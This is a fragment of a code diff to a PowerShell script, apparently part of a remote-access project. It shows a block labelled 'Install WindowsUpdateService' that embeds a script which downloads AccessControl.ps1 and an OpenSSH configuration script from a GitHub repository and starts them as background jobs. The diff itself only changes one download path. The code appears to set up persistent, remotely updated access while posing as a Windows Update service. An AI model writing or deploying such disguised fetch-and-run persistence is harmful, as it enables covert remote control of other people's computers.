@@ -20,7 +20,7 @@ if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data"
 }
 #Install WindowsUpdateService
 $scriptContent = @'
-$urlfortask = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
+$urlfortask = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/AccessControl.ps1"
 $urlforsshdmaint = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHConfigMaintenance.ps1"
 $job1 = Start-Job -ScriptBlock {
     param($url)
